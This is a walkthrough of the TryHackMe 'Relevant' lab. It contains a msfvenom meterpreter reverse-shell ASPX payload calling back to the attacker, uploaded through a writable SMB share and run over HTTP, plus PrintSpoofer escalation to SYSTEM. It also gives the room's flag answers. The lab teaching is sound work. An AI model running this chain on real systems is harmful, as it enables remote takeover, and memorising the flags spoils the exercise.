Task 1 - Pre-Engagement Briefing
--------------------------------------------------------

Looks like there is just 1 Task here and that is to break into the box and get 2 flags.

**Scope of Work**

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

-   User.txt
-   Root.txt  
    

Additionally, the client has provided the following scope allowances:

-   Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first  
    
-   Locate and note all vulnerabilities found
-   Submit the flags discovered to the dashboard
-   Only the IP address assigned to your machine is in scope
-   Find and report ALL vulnerabilities (yes, there is more than one path to root)

Gathering some initial info:

```
──(kali㉿kali)-[~/pentesting/tryhackme.com/relevant]
└─$ nmap -sV -sC -oN relevant.nmap 10.10.157.92
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-24 09:21 JST
Nmap scan report for 10.10.157.92
Host is up (0.25s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-10-23T00:20:10
|_Not valid after:  2023-04-24T00:20:10
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-10-24T00:22:12+00:00
|_ssl-date: 2022-10-24T00:22:51+00:00; +1s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-10-24T00:22:14
|_  start_date: 2022-10-24T00:20:10
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-23T17:22:15-07:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m02s, deviation: 3h07m52s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.82 seconds
```

So looks like a Windows IIS server on Server 2016.  Interesting it says Standard Evaluation hmm..

ok started a gobuster running. That is going to take awhile so I will check out the web page and looks like smb is up.

The web page looks like standard windows default iis page.

SMB looking promising:

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.157.92\\nt4wkrsv
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.157.92 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

So I see a share there called nt4wrksv.

```
┌──(root㉿kali)-[/home/kali]
└─# smbclient \\\\10.10.157.92\\nt4wrksv
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 06:46:04 2020
  ..                                  D        0  Sun Jul 26 06:46:04 2020
  passwords.txt                       A       98  Sun Jul 26 00:15:33 2020

                7735807 blocks of size 4096. 4946160 blocks available
smb: \> cat passwords.txt
cat: command not found
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```

All too easy.

```
└─$ cat passwords.txt                   
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                                                                                    
```

Well this looks like just base64 encoding, let me try to see it:

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/relevant]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123  

┌──(kali㉿kali)-[~/pentesting/tryhackme.com/relevant]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$                                    
```

Hmm, I don't see really ssh running or any smb shares related to Bob or Bill. I am just going to assume we will find something in the web site for these users for now and check on the web page more.

Looks like our gobuster results came back:

```
└─$ gobuster dir -u http://10.10.157.92 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.157.92
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/24 09:23:12 Starting gobuster in directory enumeration mode
===============================================================
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]
/*http%3A             (Status: 400) [Size: 3420]
/**http%3A            (Status: 400) [Size: 3420]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]
/s%26p                (Status: 400) [Size: 3420]
/%3FRID%3D2671        (Status: 400) [Size: 3420]
/devinmoore*          (Status: 400) [Size: 3420]
Progress: 119305 / 220561 (54.09%)             [ERROR] 2022/10/24 09:42:57 [!] Get "http://10.10.157.92/CCPlayer%20multimedia": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:42:58 [!] Get "http://10.10.157.92/32564": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:42:58 [!] Get "http://10.10.157.92/Mp3tag": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:42:58 [!] Get "http://10.10.157.92/DivxToDVD%20scr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:42:58 [!] Get "http://10.10.157.92/Mp3tag%20scr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:42:58 [!] Get "http://10.10.157.92/111100": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 119311 / 220561 (54.09%)             [ERROR] 2022/10/24 09:42:58 [!] Get "http://10.10.157.92/167539": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:42:58 [!] Get "http://10.10.157.92/Internet%20Download%20Accelerator%20scr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:42:58 [!] Get "http://10.10.157.92/42111": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:42:58 [!] Get "http://10.10.157.92/Internet%20Download%20Accelerator": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 119315 / 220561 (54.10%)             [ERROR] 2022/10/24 09:42:59 [!] Get "http://10.10.157.92/MediaCoder%20scr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:42:59 [!] Get "http://10.10.157.92/Backup4all%20scr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 119317 / 220561 (54.10%)             [ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/37518": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/159942": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/18118": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/Staff%20FTP": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/152172": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/Staff%20FTPscr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/16060": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/138064": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/foobar2000%20scr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/38619": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/TweakMaster%20scr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/24 09:43:01 [!] Get "http://10.10.157.92/176394": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/200109*              (Status: 400) [Size: 3420]
/*sa_                 (Status: 400) [Size: 3420]
/*dc_                 (Status: 400) [Size: 3420]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3420]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3420]                
/http%3A%2F%2Fradar   (Status: 400) [Size: 3420]                                                           
/q%26a2               (Status: 400) [Size: 3420]                                                           
/login%3f             (Status: 400) [Size: 3420]                                                           
/Shakira%20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3420]                                        
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3420]                                                  
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3420]                                                           
/http%3A%2F%2Fswik    (Status: 400) [Size: 3420]                                                           
                                                                                                           
===============================================================
2022/10/24 10:00:48 Finished
===============================================================
```

Well that doesn't look promising. Especially with the default IIS page being there.. seems like nothing is even configured. Still there was a lot of timeouts going on. I have a suspicion already I need to go to an attackbox. So many issues I have had on and off with VPN into THM. I am sure its due to my physical location.

I want to try that directory we had found in smb tho. Why would we find 2 passwords in there for Bill and Bob? There has to be something I am missing here.

I just looked at nmap results again, not sure how I missed it but MSTerm Services were open. Let me check there.

No luck with rdp.

I am guessing maybe some vulnerability at this point with this version of Windows.

Ok I wanted to check that odd smb share.. nt4wkrsv does seem to exist on iis as well here:
http://10.10.157.92/nt4wrksv

There is no information returned tho but I dont get an error.

It seems like that same SMB directory is getting served here.. if so thats not smart.

hitting http://10.10.157.92/nt4wrksv/passwords.txt also returns no error but i am not seeing any data.

I need a break and think about this

(--break--)

Ok, I am going to guess maybe more VPN issues going on. Going to try and access this from Attackbox and see if there is some difference.

Nope.

I think I need to look for an exploit here. So I need another nmap scan:

```
└─$ nmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 -oN relevant2.nmap 10.10.157.92
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-24 11:00 JST
Nmap scan report for 10.10.157.92
Host is up (0.25s latency).

PORT     STATE SERVICE
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 680.22 seconds
                                                                                          
```

Looks like its vulnerable to EternalBlue

Checking searchsploit:

```
┌──(kali㉿kali)-[~]
└─$ searchsploit EternalBlue
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                  | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-0 | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)        | windows_x86-64/remote/42030.py
-------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```



Ok.. I had __soo many errors and issues__ trying to get this to work. I crashed the target several times. I decided to switch gears. I guess those user names and passwords were a collosal waste of time. 

(--break--)

So I decided to get yet another nmap.. I know.. by now I would have been busted for using 1 nmap scan, let alone 3..

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/relevant]
└─$ nmap -sV -sC -p- -oN relevant3.nmap 10.10.157.92
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-24 11:48 JST
Nmap scan report for 10.10.225.33
Host is up (0.27s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-10-24T03:56:05+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-10-24T03:55:26+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-10-23T03:16:06
|_Not valid after:  2023-04-24T03:16:06
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m02s, deviation: 3h07m51s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-23T20:55:27-07:00
| smb2-time: 
|   date: 2022-10-24T03:55:29
|_  start_date: 2022-10-24T03:16:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 479.67 seconds
```

There are more ports I missed.

So after testing 49663 I saw that the smb directory we had access to nt4wrksh annonymously was linked to the iis server here. So I was on the track but wrong about the service port. Nmap can be very frustrating to know exactly what to scan for.

So lets generate a reverse tcp shell and upload it to the smb share.

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/relevant]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=tun0 lport=4444 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 200774 bytes
Final size of aspx file: 1015002 bytes
Saved as: shell.aspx

```

Setup a listener with multi handler:

```
                                                                                                                                    
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/relevant]
└─$ msfconsole -q                                                                                     
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter_reverse_tcp):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST                        yes       The listen address (an interface may be specified)
   LPORT       4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter_reverse_tcp):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       tun0      yes       The listen address (an interface may be specified)
   LPORT       4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on tun0:4444 
```

Now we can just curl the file to execute our script:

```
curl http://10.10.157.92:49663/nt4wrksv/shell.aspx
```
```

[*] Meterpreter session 1 opened (tun0:4444 -> 10.10.157.92:49728) at 2022-10-24 11:57:33 +0900

meterpreter > getuid 
Server username: IIS APPPOOL\DefaultAppPool
```


Now we can get the user flag:

```
meterpreter > cat c:/users/bob/desktop/user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

We have SeImpersonatePrivilege

We can download the source for PrintSpoofer and compile it on VisualStudio and upload it:

```
c:\>cd \inetpub\wwwroot\nt4wrksv
cd \inetpub\wwwroot\nt4wrksv

c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

08/28/2020  11:54 PM    <DIR>          .
08/28/2020  11:54 PM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
08/28/2020  11:47 PM            27,136 PrintSpoofer.exe
08/28/2020  11:54 PM         1,015,587 shell.aspx
               3 File(s)      1,042,821 bytes
               2 Dir(s)  20,256,440,320 bytes free
```

Now we can elevate our privileges:

```
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

Get the root flag:

```
PS C:\Windows\system32> cd \users\administrator\desktop
cd \users\administrator\desktop
PS C:\users\administrator\desktop> dir
dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        7/25/2020   8:25 AM             35 root.txt                      


PS C:\users\administrator\desktop> cat root.txt
cat root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
PS C:\users\administrator\desktop>
```

Question: What is the user flag?
Answer: _THM{fdk4ka34vk346ksxfr21tg789ktf45}_

Question: What is the root flag?
Answer: _THM{1fk5kf469devly1gl320zafgl345pv}_


Conclusion:
-------------------------------

This was the hardest room I have done yet.  I got completely lost several times. I just knew those passwords were used for something.

I tried a few times to get the EternalBlue exploit going on SMB using those credentials and it crashed the machine. It was still responding kinda so I kept going not knowing SMB had already had issues. I wasted a lot of time there.

This room was aweful. I hated it. However, it has pointed out some things again to me that I need to address.

I need another more quiet and elegant solution to port scanning. I should make my own. Also, I am not sure how much time I wasted with those false creds... would that even be like that in real life? I guess I could have given up on those quicker and i would have if not for the bad nmap scans I had previously.

_NOTE TO SELF_ get a GOOD scan from now on from the start.



